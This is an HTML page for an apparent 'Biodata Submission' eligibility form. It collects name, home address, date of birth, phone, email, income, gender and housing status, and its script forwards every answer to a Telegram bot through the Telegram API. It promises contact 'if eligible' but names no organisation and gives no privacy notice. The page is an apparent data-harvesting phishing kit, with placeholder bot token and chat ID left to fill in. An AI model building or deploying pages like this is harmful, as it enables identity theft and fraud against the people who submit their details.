<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Biodata Form</title>

<style>
body {
margin:0;
font-family: Arial, sans-serif;
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background: linear-gradient(-45deg, #ff4d4d, #4d79ff, #4dff88, #ffcc00);
background-size: 400% 400%;
animation: bg 10s ease infinite;
}

@keyframes bg {
0% {background-position:0% 50%;}
50% {background-position:100% 50%;}
100% {background-position:0% 50%;}
}

form {
background:#fff;
padding:25px;
border-radius:15px;
width:90%;
max-width:450px;
box-shadow:0 10px 30px rgba(0,0,0,0.2);
}

h2 {
text-align:center;
margin-bottom:15px;
}

label {
font-size:13px;
font-weight:bold;
color:#333;
margin-top:8px;
display:block;
}

input, select {
width:100%;
padding:10px;
margin-top:5px;
margin-bottom:10px;
border:1px solid #ddd;
border-radius:8px;
outline:none;
}

input:focus {
border-color:#4d79ff;
box-shadow:0 0 5px rgba(77,121,255,0.5);
}

button {
width:100%;
padding:12px;
background:#4d79ff;
border:none;
color:#fff;
font-size:16px;
border-radius:8px;
cursor:pointer;
}

button:hover {
background:#2f5bff;
transform: scale(1.02);
}

.note {
font-size:12px;
text-align:center;
color:#666;
margin-top:10px;
}
</style>
</head>

<body>

<form id="bioForm">
<h2>Biodata Submission</h2>

<label>Full Name</label>
<input type="text" id="name" placeholder="Enter your full name" required>

<label>Home Address</label>
<input type="text" id="address" placeholder="Enter your home address" required>

<label>Date of Birth</label>
<input type="date" id="dob" required>

<label>Phone Number</label>
<input type="tel" id="phone" placeholder="Enter your phone number" required>

<label>Email Address</label>
<input type="email" id="email" placeholder="Enter your email address" required>

<label>Occupation</label>
<input type="text" id="occupation" placeholder="Enter your occupation">

<label>Monthly Income</label>
<input type="text" id="income" placeholder="Enter your monthly income">

<label>Gender</label>
<select id="gender">
<option>Male</option>
<option>Female</option>
</select>

<label>Housing Status</label>
<select id="housing">
<option>Own House</option>
<option>Rent Apartment</option>
</select>

<button type="submit">Submit</button>

<p class="note">We will contact you via WhatsApp or Email if eligible</p>
</form>

<script>
const BOT_TOKEN = "YOUR_BOT_TOKEN";
const CHAT_ID = "YOUR_CHAT_ID";

document.getElementById("bioForm").addEventListener("submit", async function(e){
e.preventDefault();

let message =
`📥 NEW BIODATA SUBMISSION

👤 Name: ${name.value}
🏠 Address: ${address.value}
🎂 DOB: ${dob.value}
📞 Phone: ${phone.value}
📧 Email: ${email.value}
💼 Occupation: ${occupation.value}
💰 Income: ${income.value}
🚻 Gender: ${gender.value}
🏡 Housing: ${housing.value}`;

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
method: "POST",
headers: {"Content-Type":"application/json"},
body: JSON.stringify({
chat_id: CHAT_ID,
text: message
})
});

alert("✅ Submitted successfully!\n\nWe will contact you via WhatsApp or Email if you are eligible.");

this.reset();
});
</script>

</body>
</html>
